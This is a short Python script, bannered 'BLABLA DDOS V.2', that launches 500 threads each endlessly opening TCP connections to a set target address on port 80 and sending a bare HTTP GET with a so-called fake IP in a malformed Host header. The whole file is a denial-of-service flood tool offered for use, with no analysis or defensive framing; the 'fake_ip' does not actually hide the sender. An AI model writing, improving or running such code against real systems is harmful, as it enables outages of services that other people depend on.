import threading
import socket


banner = """
###################
#BLABLA DDOS V.2
#CODE BY BLABLABLA
###################
"""
print(banner)

target = '192.168.0.1'

port = 80

fake_ip = "182.23.23.09"

alread_connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host :" + fake_ip + " \r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global alread_connected
        alread_connected += 1
        if alread_connected % 500 == 0:
            print(alread_connected)

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()


